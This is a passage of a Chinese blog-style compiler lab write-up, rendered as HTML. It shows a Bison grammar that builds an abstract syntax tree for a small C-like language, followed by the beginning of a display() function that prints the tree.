class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line">%define parse.error verbose <span class="comment">// 指示bison生成详细的错误消息</span></span><br><span class="line">%locations <span class="comment">// 记录行号</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 声明部分 */</span></span><br><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;math.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;def.h&quot;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> yylineno;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> *yytext;</span><br><span class="line"><span class="keyword">extern</span> FILE *yyin;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* fmt, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(struct node *,<span class="keyword">int</span>)</span></span>;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 辅助声明部分 */</span></span><br><span class="line"><span class="comment">/* Bison中默认将所有的语义值都定义为int类型,可以通过定义宏YYSTYPE来改变值的类型</span></span><br><span class="line"><span class="comment">如果有多个值类型,则需要通过在Bison声明中使用%union列举出所有的类型 */</span></span><br><span class="line">%<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> type_int;</span><br><span class="line">  <span class="keyword">float</span> type_float;</span><br><span class="line">  <span class="keyword">char</span> type_char;</span><br><span class="line">  <span class="keyword">char</span> type_id[<span class="number">32</span>];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">ptr</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* %type 定义非终结符的语义值类型: %type &lt;union 的成员名&gt; 非终结符 */</span></span><br><span class="line"><span class="comment">/* %type &lt;ptr&gt; program ExtDefList:表示非终结符ExtDefList属性值的类型对应联合中成员ptr的类型,在本实验中对应一个树结点的指针 */</span></span><br><span class="line">%type &lt;ptr&gt; program ExtDefList ExtDef Specifier ExtDecList FuncDec ArrayDec CompSt VarList VarDec ParamDec Stmt StmList DefList Def DecList Dec Exp Args</span><br><span class="line"></span><br><span class="line"><span class="comment">/* %token 定义终结符的语义值类型: %token &lt;union 的成员名&gt; 终结符  */</span></span><br><span class="line"><span class="comment">/* %token &lt;type_id&gt; ID:表示识别出来一个ID标识符后,标识符的字符串值保存在成员type_id */</span></span><br><span class="line">%token &lt;type_int&gt; INT <span class="comment">// 指定INT的语义值是type_int,由词法分析得到的数值</span></span><br><span class="line">%token &lt;type_id&gt; ID RELOP TYPE <span class="comment">// 指定ID,RELOP的语义值是type_id,由词法分析得到标识符字符串</span></span><br><span class="line">%token &lt;type_float&gt; FLOAT <span class="comment">// 指定ID的语义值是type_float,由词法分析得到的数值</span></span><br><span class="line">%token &lt;type_char&gt; CHAR <span class="comment">// 指定ID的语义值是type_char,由词法分析得到的数值</span></span><br><span class="line">%token LP RP LC RC LB RB SEMI COMMA</span><br><span class="line">%token PLUS MINUS STAR DIV COMADD COMSUB ASSIGNOP AND OR NOT IF ELSE WHILE FOR RETURN</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 优先级 */</span></span><br><span class="line">%left COMADD COMSUB <span class="comment">/* %left:表示左结合,前面符号的优先级低 */</span></span><br><span class="line">%left ASSIGNOP</span><br><span class="line">%left OR</span><br><span class="line">%left AND</span><br><span class="line">%left RELOP</span><br><span class="line">%left PLUS MINUS</span><br><span class="line">%left STAR DIV</span><br><span class="line">%right UMINUS NOT AUTOADD AUTOSUB <span class="comment">/* %right:定义一个优先级更高的单目,符号UMINUS */</span></span><br><span class="line">%nonassoc LOWER_THEN_ELSE <span class="comment">/* %nonassoc:没有结合性一般与%prec结合使用,表示该操作有同样的优先级 */</span></span><br><span class="line">%nonassoc ELSE</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 规则部分 */</span></span><br><span class="line">%%</span><br><span class="line">program: ExtDefList &#123; display($<span class="number">1</span>,<span class="number">0</span>);&#125; <span class="comment">/* 归约到program,显示语法树(display是自己实现的,用于可视化AST的函数) */</span></span><br><span class="line">         ;</span><br><span class="line"><span class="comment">/* ExtDefList-外部定义列表:即是整个语法树 */</span></span><br><span class="line">ExtDefList: &#123;$$=<span class="literal">NULL</span>;&#125; <span class="comment">// 整个语法树为空 </span></span><br><span class="line">            | ExtDef ExtDefList &#123;$$=mknode(EXT_DEF_LIST,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125; <span class="comment">// 每一个EXTDEFLIST的结点,其第1棵子树对应一个外部变量声明或函数</span></span><br><span class="line">            ;</span><br><span class="line"><span class="comment">/* ExtDef-外部声明:声明外部变量或者声明函数 */</span></span><br><span class="line">ExtDef: Specifier ExtDecList SEMI &#123;$$=mknode(EXT_VAR_DEF,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125; <span class="comment">// 该结点对应一个外部变量声明</span></span><br><span class="line">        | Specifier ArrayDec SEMI &#123;$$=mknode(ARRAY_DEF,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125; <span class="comment">// 数组定义</span></span><br><span class="line">        | Specifier FuncDec CompSt &#123;$$=mknode(FUNC_DEF,$<span class="number">1</span>,$<span class="number">2</span>,$<span class="number">3</span>,yylineno);&#125; <span class="comment">// 该结点对应一个函数定义,类型+函数声明+复合语句</span></span><br><span class="line">        | error SEMI &#123;$$=<span class="literal">NULL</span>; <span class="built_in">printf</span>(<span class="string">&quot;---缺少分号---\n&quot;</span>);&#125;</span><br><span class="line">        ;</span><br><span class="line"><span class="comment">/* Specifier-类型:表示一个类型(int,float) */</span></span><br><span class="line">Specifier: TYPE &#123;$$=mknode(TYPE,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);$$-&gt;type=(!<span class="built_in">strcmp</span>($<span class="number">1</span>,<span class="string">&quot;int&quot;</span>)?INT:(!<span class="built_in">strcmp</span>($<span class="number">1</span>,<span class="string">&quot;float&quot;</span>)?FLOAT:CHAR));&#125;</span><br><span class="line">           ;</span><br><span class="line"><span class="comment">/* ExtDecList-变量名称列表:由一个或多个变量组成,多个变量之间用逗号隔开 */</span></span><br><span class="line">ExtDecList: VarDec &#123;$$=$<span class="number">1</span>;&#125; <span class="comment">// 每一个EXT_DECLIST的结点,其第一棵子树对应一个变量名(ID类型的结点),第二棵子树对应剩下的外部变量名</span></span><br><span class="line">            | VarDec COMMA ExtDecList &#123;$$=mknode(EXT_DEC_LIST,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">            ;</span><br><span class="line"><span class="comment">/* VarDec-变量名称:由一个ID组成 */</span></span><br><span class="line">VarDec: ID &#123;$$=mknode(ID,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// ID结点,标识符符号串存放结点的type_id</span></span><br><span class="line">        ;</span><br><span class="line"><span class="comment">/* FuncDec-函数声明:包括函数名和参数定义 */</span></span><br><span class="line">FuncDec: ID LP VarList RP &#123;$$=mknode(FUNC_DEC,$<span class="number">3</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// 函数名存放在$$-&gt;type_id</span></span><br><span class="line">         | ID LP RP &#123;$$=mknode(FUNC_DEC,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// 函数名存放在$$-&gt;type_id</span></span><br><span class="line">         | error RP &#123;$$=<span class="literal">NULL</span>; <span class="built_in">printf</span>(<span class="string">&quot;---函数左括号右括号不匹配---\n&quot;</span>);&#125;</span><br><span class="line">         ;</span><br><span class="line"><span class="comment">/* ArrayDec-数组声明 */</span></span><br><span class="line">ArrayDec: ID LB Exp RB &#123;$$=mknode(ARRAY_DEC,$<span class="number">3</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125;</span><br><span class="line">          | ID LB RB &#123;$$=mknode(ARRAY_DEC,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125;</span><br><span class="line">          | error RB &#123;$$=<span class="literal">NULL</span>;<span class="built_in">printf</span>(<span class="string">&quot;---数组定义错误---\n&quot;</span>);&#125;</span><br><span class="line"><span class="comment">/* VarList-参数定义列表:由一个到多个参数定义组成,用逗号隔开 */</span></span><br><span class="line">VarList: ParamDec &#123;$$=mknode(PARAM_LIST,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         | ParamDec COMMA VarList &#123;$$=mknode(PARAM_LIST,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         ;</span><br><span class="line"><span class="comment">/* ParamDec-参数定义:固定由一个类型和一个变量组成 */</span></span><br><span class="line">ParamDec: Specifier VarDec &#123;$$=mknode(PARAM_DEC,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">          ;</span><br><span class="line"><span class="comment">/* CompSt-复合语句:左右分别用大括号括起来,中间有定义列表和语句列表 */</span></span><br><span class="line">CompSt: LC DefList StmList RC &#123;$$=mknode(COMP_STM,$<span class="number">2</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">        | error RC &#123;$$=<span class="literal">NULL</span>; <span class="built_in">printf</span>(<span class="string">&quot;---复合语句内存在错误---\n&quot;</span>);&#125;</span><br><span class="line">        ;</span><br><span class="line"><span class="comment">/* StmList-语句列表:由0个或多个语句stmt组成 */</span></span><br><span class="line">StmList: &#123;$$=<span class="literal">NULL</span>;&#125;</span><br><span class="line">         | Stmt StmList &#123;$$=mknode(STM_LIST,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         ;</span><br><span class="line"><span class="comment">/* Stmt-语句:可能为表达式,复合语句,return语句,if语句,if-else语句,while语句,for语句 */</span></span><br><span class="line">Stmt: Exp SEMI &#123;$$=mknode(EXP_STMT,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | CompSt &#123;$$=$<span class="number">1</span>;&#125; <span class="comment">// 复合语句结点直接最为语句结点,不再生成新的结点</span></span><br><span class="line">      | RETURN Exp SEMI &#123;$$=mknode(RETURN,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | IF LP Exp RP Stmt %prec LOWER_THEN_ELSE &#123;$$=mknode(IF_THEN,$<span class="number">3</span>,$<span class="number">5</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | IF LP Exp RP Stmt ELSE Stmt &#123;$$=mknode(IF_THEN_ELSE,$<span class="number">3</span>,$<span class="number">5</span>,$<span class="number">7</span>,yylineno);&#125;</span><br><span class="line">      | WHILE LP Exp RP Stmt &#123;$$=mknode(WHILE,$<span class="number">3</span>,$<span class="number">5</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | FOR LP Exp RP Stmt &#123;$$=mknode(FOR,$<span class="number">3</span>,$<span class="number">5</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      ;</span><br><span class="line"><span class="comment">/* DefList-定义列表:由0个或多个定义语句组成 */</span></span><br><span class="line">DefList: &#123;$$=<span class="literal">NULL</span>; &#125;</span><br><span class="line">         | Def DefList &#123;$$=mknode(DEF_LIST,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         ;</span><br><span class="line"><span class="comment">/* Def-定义:定义一个或多个语句语句,由分号隔开 */</span></span><br><span class="line">Def: Specifier DecList SEMI &#123;$$=mknode(VAR_DEF,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">     | Specifier ArrayDec SEMI &#123;$$=mknode(ARRAY_DEF,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">     ;</span><br><span class="line"><span class="comment">/* DecList-语句列表:由一个或多个语句组成,由逗号隔开,最终都成一个表达式 */</span></span><br><span class="line">DecList: Dec &#123;$$=mknode(DEC_LIST,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         | Dec COMMA DecList &#123;$$=mknode(DEC_LIST,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         ;</span><br><span class="line"><span class="comment">/* Dec-语句:一个变量名称或者一个赋值语句(变量名称等于一个表达式) */</span></span><br><span class="line">Dec: VarDec &#123;$$=$<span class="number">1</span>;&#125;</span><br><span class="line">     | VarDec ASSIGNOP Exp &#123;$$=mknode(ASSIGNOP,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;ASSIGNOP&quot;</span>);&#125;</span><br><span class="line">     ;</span><br><span class="line"><span class="comment">/* Exp-表达式 */</span></span><br><span class="line">Exp: Exp ASSIGNOP Exp &#123;$$=mknode(ASSIGNOP,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;ASSIGNOP&quot;</span>);&#125; <span class="comment">// $$结点type_id空置未用,正好存放运算符</span></span><br><span class="line">     | Exp AND Exp &#123;$$=mknode(AND,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AND&quot;</span>);&#125;</span><br><span class="line">     | Exp OR Exp &#123;$$=mknode(OR,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;OR&quot;</span>);&#125;</span><br><span class="line">     | Exp RELOP Exp &#123;$$=mknode(RELOP,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">2</span>);&#125; <span class="comment">// 词法分析关系运算符号自身值保存在$2中</span></span><br><span class="line">     | Exp PLUS Exp &#123;$$=mknode(PLUS,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;PLUS&quot;</span>);&#125;</span><br><span class="line">     | Exp MINUS Exp &#123;$$=mknode(MINUS,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;MINUS&quot;</span>);&#125;</span><br><span class="line">     | Exp STAR Exp &#123;$$=mknode(STAR,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;STAR&quot;</span>);&#125;</span><br><span class="line">     | Exp DIV Exp &#123;$$=mknode(DIV,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;DIV&quot;</span>);&#125;</span><br><span class="line">     | Exp COMADD Exp &#123;$$=mknode(COMADD,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;COMADD&quot;</span>);&#125;</span><br><span class="line">     | Exp COMSUB Exp &#123;$$=mknode(COMSUB,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;COMSUB&quot;</span>);&#125;</span><br><span class="line">     | LP Exp RP &#123;$$=$<span class="number">2</span>;&#125; <span class="comment">/* 遇到左右括号,可直接忽略括号,Exp的值就为括号里面的Exp */</span></span><br><span class="line">     | MINUS Exp %prec UMINUS &#123;$$=mknode(UMINUS,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;UMINUS&quot;</span>);&#125;</span><br><span class="line">     | NOT Exp &#123;$$=mknode(NOT,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;NOT&quot;</span>);&#125;</span><br><span class="line">     | AUTOADD Exp &#123;$$=mknode(AUTOADD_L,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AUTOADD&quot;</span>);&#125;</span><br><span class="line">     | AUTOSUB Exp &#123;$$=mknode(AUTOSUB_L,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AUTOSUB&quot;</span>);&#125;</span><br><span class="line">     | Exp AUTOADD &#123;$$=mknode(AUTOADD_R,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AUTOADD&quot;</span>);&#125;</span><br><span class="line">     | Exp AUTOSUB &#123;$$=mknode(AUTOSUB_R,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AUTOSUB&quot;</span>);&#125;</span><br><span class="line">     | ID LP Args RP &#123;$$=mknode(FUNC_CALL,$<span class="number">3</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// 函数定义后面的括号部分,只需要把括号里面的内容传入即可</span></span><br><span class="line">     | ID LP RP &#123;$$=mknode(FUNC_CALL,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// 函数定义后面的括号部分没有参数</span></span><br><span class="line">     | ID &#123;$$=mknode(ID,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125;</span><br><span class="line">     | INT &#123;$$=mknode(INT,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);$$-&gt;type_int=$<span class="number">1</span>;$$-&gt;type=INT;&#125;</span><br><span class="line">     | FLOAT &#123;$$=mknode(FLOAT,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);$$-&gt;type_float=$<span class="number">1</span>;$$-&gt;type=FLOAT;&#125;</span><br><span class="line">     | CHAR &#123;$$=mknode(CHAR,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno); $$-&gt;type_char=$<span class="number">1</span>;$$-&gt;type=CHAR;&#125;</span><br><span class="line">     ;</span><br><span class="line"><span class="comment">/* Args-用逗号隔开的参数 */</span></span><br><span class="line">Args: Exp COMMA Args &#123;$$=mknode(ARGS,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | Exp &#123;$$=mknode(ARGS,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      ;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">  yyin=fopen(argv[<span class="number">1</span>],<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!yyin) </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  yylineno=<span class="number">1</span>;</span><br><span class="line">  yyparse();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* fmt, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  va_start(ap, fmt);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Grammar Error at Line %d Column %d: &quot;</span>, yylloc.first_line,yylloc.first_column);</span><br><span class="line">  <span class="built_in">vfprintf</span>(<span class="built_in">stderr</span>, fmt, ap);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>生成抽象语法树</strong></p>
<p>AST 不同于推导树，去掉了一些修饰性的单词部分，简明地把程序的语法结构表示出来，后续的语义分析、中间代码生成都可以通过遍历抽象语法树来完成</p>
<p>其实在语法分析的过程中，已经调用了可视化抽象语法树的函数 <code>display</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">program: ExtDefList &#123; display($<span class="number">1</span>,<span class="number">0</span>);&#125; <span class="comment">/* 归约到program,显示语法树(display是自己实现的,用于可视化AST的函数) */</span></span><br></pre></td></tr></table></figure>
<p>它的实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(struct node* T,<span class="keyword">int</span> indent)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T)&#123;</span><br><span class="line">        <span class="keyword">switch</span> (T-&gt;kind)&#123;</span><br><span class="line">            <span class="keyword">case</span> EXT_DEF_LIST:  </span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> EXT_VAR_DEF:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;外部变量定义：&quot;</span>);     </span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;变量名：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FUNC_DEF:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;函数定义：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">2</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ARRAY_DEF:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;数组定义：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FUNC_DEC:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;函数名：&quot;</span>,T-&gt;type_id);</span><br><span class="line">                <span 